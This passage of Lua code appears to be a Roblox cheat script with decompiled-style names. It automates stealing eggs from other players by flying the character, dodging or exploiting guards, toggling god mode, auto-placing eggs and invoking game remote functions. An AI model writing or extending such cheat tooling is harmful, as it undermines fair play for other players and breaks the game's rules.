				if not fn35(position + Vector3.new(0, 3, 0), arg2, nil, n2) then
					return false
				end
				str2 = "Taking the egg"
				local v21 = fn44(arg, arg2, 0.6, nil)

				if not v21 and not fn13(arg2) then
					v21 = fn30(arg, arg2)
				end

				if not v21 and not fn31(arg.Uid, arg2) then
					tbl18[arg.Uid] = os.clock() + n7
					return false
				end
				tbl4.Steal.LastFinishedAt = os.clock()
				return true
			end

			local tbl20 = { Uid = nil, Freed = nil, Token = nil }
			local n19 = 3

			local function fn52()
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				world = world and world:FindFirstChild("Areas")
				world = world and world:FindFirstChild("GuardAreas")
				local v21 = tbl4.Root()
				if not world or not v21 then
					return nil
				end
				local str3 = tostring(localPlayer.UserId)
				local carryAreaId = tbl4.Steal.CarryAreaId and fn39({ AreaId = tostring(tbl4.Steal.CarryAreaId) }) or nil
				local huge = math.huge
				local v22 = nil

				for _, child in ipairs(world:GetChildren()) do
					local guard = child:FindFirstChild("Guard")

					if guard then
						if tostring(guard:GetAttribute("TargetPlayer")) == str3 or tostring(guard:GetAttribute("WakeTargetPlayer")) == str3 then
							return guard
						end

						local ok, result = pcall(function()
							return guard:GetPivot().Position
						end)

						if ok then
							local magnitude = (result - v21.Position).Magnitude

							if magnitude < huge then
								v22 = guard
								huge = magnitude
							end
						end
					end
				end

				return carryAreaId or v22
			end

			local function fn53(arg, arg2, arg3)
				local v21 = fn52()
				if not v21 then
					return false
				end
				local v22 = fn42(arg, arg3 + Vector3.new(0, 3, 0))
				local n20 = 0

				while true do
					if not v22.Landed and n20 < n12 and not fn13(arg) then
						local ok, result = pcall(function()
							return v21:GetPivot().Position
						end)

						local v23 = tbl4.Root()

						if not (not ok or not v23) then
							if n15 + 5 < (result - v23.Position).Magnitude then
								local vector = Vector3.new(v23.Position.X - result.X, 0, v23.Position.Z - result.Z)
								local n21 = result + (vector.Magnitude > 0.1 and vector.Unit * n15 or Vector3.zero)

								fn35(Vector3.new(n21.X, result.Y + 3, n21.Z), arg, nil, n2, true, function()
									if v22.Landed then
										return "hit"
									end
									return nil
								end)
							end

							n20 += RunService.Heartbeat:Wait()
							continue
						end
					end

					break
				end

				v22.Stop()
				if not v22.Landed then
					return false
				end
				return fn50(arg, arg2)
			end

			local function fn54(arg)
				local n20 = 0

				while tbl4.AntiGuard.Busy and n20 < 4 and not fn13(arg) do
					str2 = "Anti Guard is slipping past the guard"
					n20 += RunService.Heartbeat:Wait()
				end

				local n21 = 0

				while not tbl4.Steal.Carrying and n21 < n11 and not fn13(arg) do
					str2 = "Checking the egg in hand"
					n21 += RunService.Heartbeat:Wait()
				end

				if not tbl4.Steal.Carrying then
					str2 = "The egg is gone, staying to look for it"
					if not fn50(arg) then
						str2 = "The egg is gone"
						return false
					end
				end

				local v21 = stealHome()
				local v22 = tbl4.Root()
				if not v21 or not v22 then
					return false
				end
				local n22 = math.max(v22.Position.Y, v21.Y) + n5

				local function fn55()
					if tbl20.Uid and tbl20.Freed and tbl4.Steal.Carrying then
						return "priority"
					end
					return nil
				end

				local flag3 = true
				local n23 = 0

				while true do
					local v23 = tbl4.Root()

					if not v23 then
						return false
					else
						str2 = "Flying home"
						local position = v23.Position
						local n24 = math.max(n22, position.Y)
						local v24, v25 = fn35(Vector3.new(position.X + (v21.X - position.X) * 0.25, position.Y + (n24 - position.Y) * 0.7, position.Z + (v21.Z - position.Z) * 0.25), arg, flag3, nil, nil, fn55)

						if v24 then
							v24, v25 = fn35(Vector3.new(v21.X, n24, v21.Z), arg, flag3, nil, nil, fn55)
						end

						if v24 then
							v24, v25 = fn35(v21, arg, flag3, nil, nil, fn55)
						end

						if v24 then
							local character = localPlayer.Character
							character = character and character:FindFirstChildOfClass("Humanoid")

							if character then
								character.PlatformStand = false
							end

							task.wait(0.2)
							if not tbl4.Steal.Carrying then
								str2 = "Arrived without the egg"
								return false
							end
							local eggState = tbl.EggState

							if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
								pcall(eggState.DropFieldEgg, "PlayerRequest")
							end

							return true
						end

						if v25 == "priority" then
							local uid2 = tbl20.Uid
							local freed = tbl20.Freed
							local v26 = tbl20
							tbl20.Uid = nil
							v26.Freed = nil
							local v27 = tbl4.Root()
							if not v27 or not uid2 or not freed then
								return false
							end

							if (freed - v27.Position).Magnitude <= n2 * n19 then
								str2 = "Best egg fell nearby, swapping eggs"
								local eggState = tbl.EggState

								if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
									pcall(eggState.DropFieldEgg, "PlayerRequest")
								end

								local n25 = 0

								while tbl4.Steal.Carrying and n25 < 1 do
									n25 += RunService.Heartbeat:Wait()
								end

								if not fn50(arg, uid2) then
									return false
								end
							else
								str2 = "Best egg fell far away, riding a guard hit to it"
								if not fn53(arg, uid2, freed) then
									return false
								end
							end

							local v28 = tbl4.Root()
							n23 = 0

							if v28 then
								n22 = math.max(v28.Position.Y, v21.Y) + n5
							end

							continue
						end

						if v25 == "dropped" and n23 < n17 then
							n23 += 1
							if not fn50(arg) then
								return false
							end
							continue
						end

						break
					end
				end

				return false
			end

			local function fn55(arg)
				local n20 = tonumber(arg) or 0
				local tbl21 = { "", "K", "M", "B", "T", "Qa", "Qi" }
				local n21 = 1

				while math.abs(n20) >= 1000 and n21 < #tbl21 do
					n20 /= 1000
					n21 += 1
				end

				return string.format(n21 == 1 and "%.0f%s" or "%.2f%s", n20, tbl21[n21])
			end

			local function fn56(arg)
				if not arg then
					return "None"
				end
				local format = string.format
				local str3 = tostring(arg.Category)
				local n20 = tonumber(arg.Scale) or 0
				local v21 = tostring
				local areaId = arg.AreaId
				local v22 = format("%s  %.2fx  |  value %s  |  %s", str3, n20, fn55(arg.Value), v21(areaId))
				local str4

				if arg.State == "Dropped" then
					str4 = v22 .. "  |  dropped"
				elseif arg.State == "Carried" then
					str4 = v22 .. "  |  carried by a player"
				else
					str4 = v22
				end

				return str4
			end

			local flag3 = false
			local n20 = 0.5
			local n21 = 0.6
			local n22 = 0
			local n23 = 0

			local function fn57()
				local v21 = n6
				tbl4.Steal.Active = true
				tbl4.Steal.Carrying = tbl4.Steal.Carrying == true

				if not tbl4.Steal.Carrying then
					tbl4.Steal.CarryUid = nil
				end

				local v22 = fn19(false, true)
				local v23 = nil
				local v24 = nil

				for _, v25 in ipairs(v22) do
					if v25.State == "Carried" then
						v24 = v24 or v25
					else
						v23 = v25
						break
					end
				end

				local tbl21 = { v23 }
				uid = v23 and v23.Uid or nil
				tbl4.Steal.Wanted = v23 ~= nil
				str = fn56(v23)

				if v24 then
					str ..= "  |  watching " .. tostring(v24.Category)
				end

				if not v23 then
					tbl4.Steal.Active = false
					str2 = v24 and "Best egg is carried, waiting for it" or "No egg matches"
					return false
				end

				if not tbl4.ClaimMovement("steal") then
					tbl4.Steal.Active = false
					str2 = "Waiting for Auto Place"
					return false
				end

				if tbl4.Treadmill.Riding or tbl4.OnBelt() then
					tbl4.ExitBelt()
				end

				flag3 = true
				tbl4.HoldBelt()

				local function fn58(arg)
					str2 = arg
					local v25 = fn51(v23, v21)
					local flag4 = false
					local v26 = nil

					if v25 then
						if fn29(v23.Uid, v21) then
							flag4 = fn54(v21)
							v26 = nil
						else
							v26 = str2
						end
					end

					fn25()
					tbl4.Steal.Active = false
					tbl4.Steal.LastFinishedAt = os.clock()
					str2 = flag4 and "Delivered" or v26 or v25 and "Run ended" or "That egg would not come free"
					return true
				end

				local v25 = tbl4.Root()
				local position = typeof(v23.CFrame) == "CFrame" and v23.CFrame.Position or nil

				if v25 and position then
					local flag4 = (position - v25.Position).Magnitude <= n16
					local areaId = v23.AreaId
					local flag5 = localPlayer:GetAttribute("AreaId") == areaId
					if flag4 or flag5 then
						return (fn58("Target is right here, taking it"))
					end
				end

				local v26 = fn19(true)
				local str3 = "FirstAreaEgg_" .. tostring(localPlayer.UserId)
				local tbl22 = {}

				for _, v27 in ipairs(v26) do
					local v28 = fn40(v27)
					local flag4

					if v28 then
						flag4 = v28
					else
						flag4 = type(v27.Uid) == "string" and string.sub(v27.Uid, 1, #str3) == str3
					end

					if flag4 then
						table.insert(tbl22, v27)
					end
				end

				if #tbl22 ~= 0 then
					v26 = tbl22
				end

				local v27, v28 = fn32(v26)

				if not v27 then
					tbl4.Steal.Active = false
					str2 = "No egg matches"
					return false
				end

				if v27.Uid == v23.Uid then
					return (fn58("Target is the closest egg, taking it"))
				end
				local v29, v30 = fn41(v27)
				local v31

				if v30 and v25 then
					local v32, v33, v34 = ipairs(v26)
					local huge = math.huge
					local v35 = v27

					for _, v36 in v32, v33, v34 do
						local position2 = typeof(v36.CFrame) == "CFrame" and v36.CFrame.Position or nil

						if v36.Uid ~= v23.Uid and v36.AreaId == v27.AreaId and position2 then
							local magnitude = (position2 - v25.Position).Magnitude

							if n13 < (position2 - v30).Magnitude then
								magnitude += n13
							end

							if magnitude < huge then
								huge = magnitude
								v35 = v36
							end
						end
					end

					v31 = v35
				else
					v31 = v27
				end

				str2 = string.format("Sleeping guard egg %d studs away", math.floor(v28 + 0.5))

				if not v31 then
					tbl4.Steal.Active = false
					str2 = "No egg matches"
					return false
				end

				local v32, v33 = fn45(v31, v21, false, tbl21[1])
				if not v32 then
					tbl4.Steal.Active = false
					return false
				end
				local uid2 = nil
				local uid3 = v23.Uid
				local n24 = 0

				while true do
					if v33 and not fn13(v21) then
						str2 = "Holding for the guard hit"

						if fn43(v21, v33, function(arg)
							if not uid2 and tbl20.Uid and tbl20.Freed then
								uid2 = tbl20.Uid
								arg.Destination = tbl20.Freed + Vector3.new(0, 3, 0)
								local v34 = tbl20
								tbl20.Uid = nil
								v34.Freed = nil
								str2 = "Best egg fell, jumping to it instead"
							end
						end) then
							n24 += 1

							if uid2 then
								uid3 = uid2
								fn50(v21, uid2)
								break
							else
								local v34 = tbl21[n24]
								local v35
								v35, v33 = fn45(v34, v21, true, tbl21[n24 + 1])

								if v35 then
									if v34 and type(v34.Uid) == "string" then
										uid3 = v34.Uid
									end

									continue
								end
							end
						end
					end

					break
				end

				if not fn29(uid3, v21) then
					local v34 = str2
					fn25()
					tbl4.Steal.Active = false
					tbl4.Steal.LastFinishedAt = os.clock()
					str2 = v34
					return true
				end

				local v34 = fn54(v21)
				fn25()
				tbl4.Steal.Active = false
				tbl4.Steal.LastFinishedAt = os.clock()
				str2 = v34 and "Delivered" or "Run ended"
				return true
			end

			local eggState = tbl.EggState

			if type(eggState) == "table" then
				for _, v21 in ipairs({ "FieldRefreshed", "FieldShifted", "FieldGone", "SnapshotRefreshed" }) do
					local v22 = eggState[v21]

					if type(v22) == "table" and type(v22.Connect) == "function" then
						local ok, result = pcall(v22.Connect, v22, function()
							tbl3.Wake()
						end)

						if ok and result then
							fn4(function()
								pcall(function()
									result:Disconnect()
								end)
							end)
						end
					end
				end
			end

			tbl3.Add(function()
				local flag4

				if v17 then
					flag4 = type(v17.Set) == "function"
				end

				if flag4 then
					pcall(v17.Set, nil, str2)
				end

				local flag5 = nil

				if v18 then
					flag5 = type(v18.Set) == "function"
				end

				if flag5 then
					pcall(v18.Set, nil, str)
				end

				if not tbl4.Toggle(v16, false) then
					return false
				end
				local v21, v22, v23 = fn14()

				if v21 then
					if v22 == "night" then
						fn16()
					end

					tbl4.Movement.StealFirst = true
					tbl4.Steal.Wanted = false

					if flag2 then
						n6 += 1
						tbl4.Steal.Active = false
						fn25()
						tbl4.StopWalking()
					end

					local n24 = math.max(0, math.ceil(v21 - v23))

					if v22 == "wall" then
						str2 = string.format("Field wall up, %ds", n24)
					else
						str2 = string.format("Night, going again in %ds", n24)
					end

					return false
				end

				if v19 and n9 == math.huge then
					n9 = os.clock() + n8
				end

				if flag2 then
					return true
				end

				if fn17() then
					str2 = "Night over, waiting for the field to reset"
					tbl3.Wake()
					return false
				end

				local stealFirst = tbl4.Movement.StealFirst
				local owner = tbl4.Movement.Owner

				if tbl4.Movement.PlaceWanted and not stealFirst or owner ~= nil and owner ~= "steal" and owner ~= "treadmill" and owner ~= "scramble" then
					if n22 <= os.clock() then
						n22 = os.clock() + n20
						local ok, result = pcall(fn19, false, false)
						ok = ok and type(result) == "table" and result[1] ~= nil
						tbl4.Steal.Wanted = ok

						if ok then
							tbl4.Movement.StealFirst = true
						end
					end

					if tbl4.Steal.Wanted then
						local v24 = tostring
						owner = owner or "Auto Place"
						str2 = "Egg found, waiting for " .. v24(owner) .. " to stop"
					else
						str2 = "Waiting for " .. tostring(owner or "Auto Place")
					end

					return true
				end

				if os.clock() < n23 then
					return true
				end
				tbl4.Movement.StealFirst = false
				flag2 = true

				task.spawn(function()
					local ok = pcall(fn57)

					if flag3 then
						flag3 = false
						tbl4.ReleaseBelt()
					end

					if not ok then
						fn25()
						tbl4.Steal.Active = false
					end

					local v24 = uid
					uid = nil
					local v25 = v24 and tbl14[v24]

					if v25 and v25.Once then
						tbl14[v24] = nil
					end

					local v26 = tbl20
					local v27 = tbl20
					tbl20.Uid = nil
					v26.Freed = nil
					v27.Token = nil

					if str2 == "Delivered" and not tbl4.IsNight() then
						tbl4.Movement.StealFirst = true
					end

					if not tbl4.Steal.Wanted then
						n23 = os.clock() + n21
					end

					tbl4.ReleaseMovement("steal")
					flag2 = false
					tbl3.Wake()
				end)

				return true
			end)
		end

		v16 = v4

		fn12 = function()
			n6 += 1
			table.clear(tbl18)
			tbl4.Steal.Active = false
			tbl4.Steal.Wanted = false
			local v20 = tbl4.Toggle(v16, false)
			tbl4.Shield("steal", v20)

			if not v20 then
				tbl4.Movement.StealFirst = false
				table.clear(tbl14)
				table.clear(tbl15)
				table.clear(tbl16)
			end

			fn25()
			tbl4.StopWalking()
			tbl3.Wake()
		end

		do
			local function fn33()
				n6 += 1
				tbl4.Steal.Active = false
				fn25()
				tbl4.StopWalking()
			end

			local function fn34()
				if tbl4.Toggle(v16, false) then
					return true
				end

				if v16 and type(v16.Set) == "function" then
					pcall(v16.Set, v16, true)
				end

				return false
			end

			tbl4.CancelSteal = function(arg)
				if type(arg) ~= "string" then
					return
				end
				tbl14[arg] = nil
				tbl15[arg] = nil
				tbl16[arg] = true

				if flag2 and uid == arg then
					fn33()
				end

				tbl3.Wake()
			end

			tbl4.StealQueue = function()
				local tbl19 = {}

				for k in pairs(tbl14) do
					table.insert(tbl19, k)
				end

				table.sort(tbl19, function(arg, arg2)
					local at = tbl14[arg].At
					local at2 = tbl14[arg2].At
					if at ~= at2 then
						return at < at2
					end
					return arg < arg2
				end)

				return tbl19
			end

			tbl4.PrioritizeSteal = function(arg)
				if type(arg) ~= "string" or fn15() then
					return
				end
				local n14 = 0

				for _, v20 in pairs(tbl14) do
					if v20.At < n14 then
						n14 = v20.At
					end
				end

				tbl14[arg] = { At = n14 - 1, Once = false }
				tbl16[arg] = nil
				tbl18[arg] = nil

				if fn34() and flag2 and not tbl4.Steal.Carrying and uid ~= arg then
					fn33()
				end

				tbl3.Wake()
			end

			tbl4.MoveInPlan = function(arg, arg2)
				if type(arg) ~= "string" or arg2 ~= -1 and arg2 ~= 1 or fn15() then
					return
				end
				local v20 = tbl4.StealPlan()
				local v21 = table.find(v20, arg)
				local n14 = v21 and v21 + arg2
				if not n14 or n14 < 1 or n14 > #v20 then
					return
				end
				table.remove(v20, v21)
				table.insert(v20, n14, arg)
				local n15 = math.max(v21, n14)

				for i, v22 in ipairs(v20) do
					if i <= n15 or tbl14[v22] then
						local v23 = tbl14[v22]

						if v23 then
							v23.At = i
						else
							tbl14[v22] = { At = i, Once = false }
						end

						tbl16[v22] = nil
					end
				end

				if flag2 and not tbl4.Steal.Carrying and uid and v20[1] ~= uid then
					fn33()
				end

				tbl3.Wake()
			end

			tbl4.StealPlan = function()
				if not tbl4.Toggle(v16, false) or tbl4.IsNight() then
					return {}, nil
				end
				local tbl19 = {}

				if uid then
					table.insert(tbl19, uid)
				end

				local ok, result = pcall(fn19, false, true)

				if ok and type(result) == "table" then
					for _, v20 in ipairs(result) do
						if v20.Uid ~= uid then
							table.insert(tbl19, v20.Uid)
						end
					end
				end

				return tbl19, uid
			end

			tbl4.SetPriority = function(arg, arg2)
				if arg2 then
					tbl4.PrioritizeSteal(arg)
				else
					tbl4.CancelSteal(arg)
				end
			end

			tbl4.StealNow = function(arg, arg2)
				if type(arg) ~= "string" or fn15() then
					return
				end

				if not tbl14[arg] then
					local n14 = 0

					for _, v20 in pairs(tbl14) do
						if v20.At > n14 then
							n14 = v20.At
						end
					end

					tbl14[arg] = { At = n14 + 1, Once = arg2 == true }
				end

				tbl16[arg] = nil
				tbl18[arg] = nil
				local flag3 = fn34() and flag2 and not tbl4.Steal.Carrying and uid ~= arg

				if flag3 then
					flag3 = not (uid and tbl14[uid])
				end

				if flag3 then
					fn33()
				end

				tbl3.Wake()
			end
		end

		fn4(function()
			tbl4.GodMode(false)
			tbl4.ReleaseMovement("steal")
			fn25()
		end)

		tbl4.UiQueue = {}

		tbl4.UiDefer = function(arg)
			table.insert(tbl4.UiQueue, arg)
		end

		tbl4.Notify = function(arg, arg2)
			if type(v) == "table" and type(v.Notify) == "function" then
				pcall(v.Notify, arg, arg2, 5)
			end
		end

		local connection = RunService.Heartbeat:Connect(function()
			local uiQueue = tbl4.UiQueue
			if #uiQueue == 0 then
				return
			end
			tbl4.UiQueue = {}

			for _, v20 in ipairs(uiQueue) do
				pcall(v20)
			end
		end)

		fn4(function()
			pcall(function()
				connection:Disconnect()
			end)
		end)

		tbl4.Rift = { Requirements = {}, At = 0, Busy = false, Next = 0, Handles = {}, Restart = {} }

		tbl4.RiftOn = function(arg)
			local v20 = tbl4.Rift.Handles[arg]
			return v20 ~= nil and tbl4.Toggle(v20, false) == true
		end

		do
			local n14 = 8

			local function fn33(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				local flag3 = type(directory) == "table" and directory[tostring(arg)] or nil
				return type(flag3) == "table" and flag3 or nil
			end

			tbl4.EggRarity = function(arg)
				local rarity = fn33(arg.AssetCategory)
				rarity = rarity and rarity.Rarity or nil
				local flag3 = type(rarity) == "table"

				if flag3 then
					flag3 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return flag3 or 0
			end

			tbl4.EggIncome = function(arg)
				local n15 = fn33(arg.AssetCategory)
				n15 = n15 and tonumber(n15.EarningRate) or 0
				local n16 = tonumber(arg.AssetScale) or 0
				if n16 <= 0 then
					return 0
				end
				local n17 = n16 > 5 and (n16 / 5) ^ 1.2 * 19.637875755794113 or n16 ^ 1.85
				local mutations = tbl.Mutations
				local flag3 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n18 = 1

				if flag3 then
					local ok
					ok, n18 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
					local flag4 = ok and type(n18) == "number"
					local n19 = 1

					if not flag4 then
						n18 = n19
					end
				end

				return n15 * n17 * n18
			end

			tbl4.RiftShortfall = function()
				local tbl19 = {}

				for _, requirement in ipairs(tbl4.Rift.Requirements) do
					tbl19[requirement] = (tbl19[requirement] or 0) + 1
				end

				if next(tbl19) == nil then
					return tbl19
				end
				local save2 = tbl.Save
				local flag3 = type(save2) == "table" and type(save2.Get) == "function"
				local flag4 = nil

				if flag3 then
					local ok, result = pcall(save2.Get)
					flag4 = ok and type(result) == "table" and result or nil
				end

				if not flag4 then
					return {}
				end
				local tbl20 = {}
				local v20 = pairs
				local equippedAssets = flag4.EquippedAssets or {}

				for _, equippedAsset in v20(equippedAssets) do
					tbl20[equippedAsset] = true
				end

				local v21 = pairs
				local inventory = flag4.Inventory or {}

				for k, v22 in v21(inventory) do
					local str3 = type(v22) == "table" and tostring(v22.Category) or nil
					local flag5

					if str3 then
						flag5 = (tbl19[str3] or 0) > 0
					else
						flag5 = str3
					end

					flag5 = flag5 and v22.InFuse ~= true and v22.IsFavorite ~= true and not tbl20[k]

					if flag5 then
						tbl19[str3] = tbl19[str3] - 1
					end
				end

				for k, v22 in pairs(tbl19) do
					if v22 <= 0 then
						tbl19[k] = nil
					end
				end

				return tbl19
			end

			local function fn34()
				for k in pairs(tbl4.Rift.Handles) do
					if tbl4.RiftOn(k) then
						return true
					end
				end

				return false
			end

			tbl3.Add(function()
				local rift = tbl4.Rift
				local busy = rift.Busy
				local flag3

				if busy then
					flag3 = busy
				else
					local next_ = rift.Next
					flag3 = os.clock() < next_
				end

				if flag3 or not fn34() then
					return false
				end
				rift.Busy = true
				rift.Next = os.clock() + n14

				task.spawn(function()
					local rfRiftAskState = networking:FindFirstChild("RF/Rift/AskState")

					if rfRiftAskState and rfRiftAskState:IsA("RemoteFunction") then
						local ok, result = pcall(rfRiftAskState.InvokeServer, rfRiftAskState)

						if ok and type(result) == "table" then
							local requirements = {}

							if result.Unlocked == true and type(result.Requirements) == "table" then
								for _, requirement in ipairs(result.Requirements) do
									table.insert(requirements, tostring(requirement))
								end
							end

							rift.Requirements = requirements
							rift.At = os.clock()
						end
					end

					rift.Busy = false
					tbl3.Wake()
				end)

				return false
			end)
		end

		local tbl19
		tbl19 = { "Always", "Steal Idle", "After Steal", "Night Only" }
		local tbl20
		tbl20 = { "Biggest Size", "Highest Value", "Smallest Size", "Backpack Order" }
		local v20
		v20 = tbl19[1]
		local v21
		v21 = tbl20[2]
		local tbl21
		tbl21 = {}
		local tbl22
		tbl22 = {}
		local n14
		n14 = 0

		do
			local function fn33()
				if type(tbl4.PlaceEggRefresh) == "function" then
					tbl4.PlaceEggRefresh()
				end
			end

			local function fn34(arg)
				local tbl23 = {}

				if type(arg) == "table" then
					for k, v22 in pairs(arg) do
						k = v22 == true and type(k) == "string" and k or type(v22) == "string" and v22 or nil

						if k then
							table.insert(tbl23, k)
						end
					end
				end

				return tbl23
			end

			tbl4.PlaceEggStatusRow = v9:CreateText({ Name = "Pen Status", Text = "Pen status unknown" })

			tbl4.PlaceEggHandle = v9:CreateToggle({
				Name = "Auto Place Egg",
				Default = false,
				Callback = function()
					if type(tbl4.PlaceEggRestart) == "function" then
						tbl4.PlaceEggRestart()
					end
				end,
			})

			local placeEggHandle = tbl4.PlaceEggHandle

			v9:CreateDropdown({
				Name = "Place Egg Rule",
				Options = tbl19,
				Default = tbl19[1],
				SubOf = placeEggHandle,
				Callback = function(arg)
					if table.find(tbl19, arg) then
						v20 = arg
					end
				end,
			})

			v9:CreateDropdown({
				Name = "Place Egg Order",
				Options = tbl20,
				Default = tbl20[2],
				SubOf = placeEggHandle,
				Callback = function(arg)
					if table.find(tbl20, arg) then
						v21 = arg
					end
				end,
			})

			local tbl23 = {}

			for i = 2, #tbl7 do
				table.insert(tbl23, tbl7[i])
			end

			if #tbl23 > 0 then
				fn6(v9:CreateMultiDropdown({
					Name = "Place Rarities",
					Note = "Only place eggs of the picked rarities (empty = all)",
					Options = tbl23,
					Default = {},
					SubOf = placeEggHandle,
					Callback = function(arg)
						local tbl24 = {}

						for _, v22 in ipairs(fn34(arg)) do
							local v23 = tbl8[v22]

							if v23 and v23 > 0 then
								tbl24[v23] = true
							end
						end

						tbl21 = tbl24
						fn33()
					end,
				}))
			end

			local tbl24 = {}
			local tbl25 = {}
			local directory = tbl.Assets and tbl.Assets.Directory
			local tbl26 = {}

			if type(directory) == "table" then
				for k, v22 in pairs(directory) do
					local rarity = type(v22) == "table" and v22.Rarity or nil
					local flag3 = type(rarity) == "table"

					if flag3 then
						flag3 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					flag3 = flag3 or nil

					if flag3 then
						table.insert(tbl26, {
							Category = tostring(k),
							Name = tostring(v22.DisplayName or k),
							Rarity = flag3,
							RarityName = tostring(rarity.DisplayName or rarity._id or flag3),
						})
					end
				end
			end

			table.sort(tbl26, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity > arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v22 in ipairs(tbl26) do
				local str3 = string.format("%s [%s]", v22.Name, v22.RarityName)

				if tbl25[str3] then
					str3 = string.format("%s [%s] (%s)", v22.Name, v22.RarityName, v22.Category)
				end

				table.insert(tbl24, str3)
				tbl25[str3] = v22.Category
			end

			if #tbl24 > 0 then
				fn6(v9:CreateMultiDropdown({
					Name = "Place Specific Eggs",
					Note = "Only place these eggs (empty = all)",
					Options = tbl24,
					Default = {},
					SubOf = placeEggHandle,
					Callback = function(arg)
						local tbl27 = {}

						for _, v22 in ipairs(fn34(arg)) do
							if tbl25[v22] then
								tbl27[tbl25[v22]] = true
							end
						end

						tbl22 = tbl27
						fn33()
					end,
				}))
			end

			local tbl27 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local n15 = 0
			local str3 = "M/s"

			local function fn35(arg, arg2)
				if arg ~= nil then
					n15 = math.max(0, math.floor(tonumber(arg) or n15))
				end

				if arg2 ~= nil then
					str3 = tostring(arg2)
				end

				n14 = n15 * (tbl27[str3] or tbl27["M/s"]).Mult
			end

			fn5(v9, {
				Name = "Min Place Value",
				Note = "Skip eggs worth less than this (0 = off)",
				SubOf = placeEggHandle,
				Legacy = "Place Min Value",
				SectionName = "Auto Place Egg",
				OnRaw = function(arg)
					fn35(math.floor(arg / 1000), "K/s")
				end,
			})
		end

		do
			local n15 = 5
			local n16 = 26
			local n17 = 6
			local n18 = 8
			local n19 = 0
			local n20 = 30
			local n21 = 12
			local placeEggHandle = nil
			local placeEggStatusRow = nil
			local str3 = "Pen status unknown"
			local flag3 = false
			local tbl23 = {}
			local n22 = 0
			local v22 = nil
			local n23 = 30

			local function fn33(arg, arg2)
				local v23 = networking:FindFirstChild(arg)
				if not v23 or not v23:IsA("RemoteFunction") then
					return false, nil
				end
				return pcall(v23.InvokeServer, v23, arg2)
			end

			local function fn34(arg)
				local directory = tbl.Assets and tbl.Assets.Directory
				local flag4 = type(directory) == "table" and directory[tostring(arg.AssetCategory)] or nil
				return type(flag4) == "table" and flag4 or nil
			end

			local function fn35(arg)
				local v23 = fn34(arg)
				local rarity = v23 and v23.Rarity or nil
				local flag4 = type(rarity) == "table"

				if flag4 then
					flag4 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return flag4 or 0
			end

			local function fn36(arg)
				local n24 = fn34(arg)
				n24 = n24 and tonumber(n24.EarningRate) or 0
				local n25 = tonumber(arg.AssetScale) or 0
				if n25 <= 0 then
					return 0
				end
				local n26 = n25 > 5 and (n25 / 5) ^ 1.2 * 19.637875755794113 or n25 ^ 1.85
				local mutations = tbl.Mutations
				local flag4 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n27 = 1

				if flag4 then
					local ok
					ok, n27 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
					ok = ok and type(n27) == "number"
					local n28 = 1

					if not ok then
						n27 = n28
					end
				end

				return n24 * n26 * n27
			end

			local function fn37()
				local tbl24 = {}
				local backpack = localPlayer:FindFirstChildOfClass("Backpack")
				if not backpack then
					return tbl24
				end
				local n24 = 0

				for _, child in ipairs(backpack:GetChildren()) do
					local attribute = child:GetAttribute("UID")

					if type(attribute) == "string" then
						n24 += 1
						tbl24[attribute] = n24
					end
				end

				return tbl24
			end

			local function fn38()
				local eggState = tbl.EggState
				if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return {}
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return {}
				end
				local v23 = fn37()
				local tbl24 = {}

				if tbl4.RiftOn("Place") then
					tbl24 = tbl4.RiftShortfall()

					for _, v24 in pairs(result) do
						if type(v24) == "table" and v24.Placement ~= nil then
							local str4 = tostring(v24.AssetCategory)

							if (tbl24[str4] or 0) > 0 then
								tbl24[str4] = tbl24[str4] - 1
							end
						end
					end
				end

				local tbl25 = {}

				for k, v24 in pairs(result) do
					if type(v24) == "table" and v24.Placement == nil and not tbl23[k] then
						local v25 = fn36(v24)
						local str4 = tostring(v24.AssetCategory)
						local flag4 = next(tbl21) == nil or tbl21[fn35(v24)] == true
						local flag5 = next(tbl22) == nil or tbl22[str4] == true
						local flag6 = n14 <= 0 or v25 >= n14
						local flag7 = (tbl24[str4] or 0) > 0

						if flag7 then
							tbl24[str4] = tbl24[str4] - 1
						end

						if flag7 then
							flag6 = flag7
						else
							flag6 = flag4 and flag5 and flag6
						end

						if flag6 then
							table.insert(tbl25, {
								Uid = k,
								Scale = tonumber(v24.AssetScale) or 0,
								Income = v25,
								Slot = v23[k] or math.huge,
								Rift = flag7,
							})
						end
					end
				end

				table.sort(tbl25, function(arg, arg2)
					if arg.Rift ~= arg2.Rift then
						return arg.Rift
					end

					if v21 == tbl20[2] and arg.Income ~= arg2.Income then
						return arg.Income > arg2.Income
					end

					if v21 == tbl20[3] and arg.Scale ~= arg2.Scale then
						return arg.Scale < arg2.Scale
					end

					if v21 == tbl20[4] and arg.Slot ~= arg2.Slot then
						return arg.Slot < arg2.Slot
					end
					return arg.Scale > arg2.Scale
				end)

				return tbl25
			end

			local function fn39(arg)
				if arg == 0 then
					return false
				end
				local steal = tbl4.Steal
				if v20 == tbl19[2] then
					return not steal.Active and not steal.Carrying
				end

				if v20 == tbl19[3] then
					local flag4 = steal.LastFinishedAt > 0

					if flag4 then
						local lastFinishedAt = steal.LastFinishedAt
						flag4 = os.clock() - lastFinishedAt <= n21
					end

					return flag4
				end

				if v20 == tbl19[4] then
					return tbl4.IsNight()
				end
				return true
			end

			local function fn40()
				local eggState = tbl.EggState
				local flag4 = type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function"
				local n24 = 0

				if flag4 then
					local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)

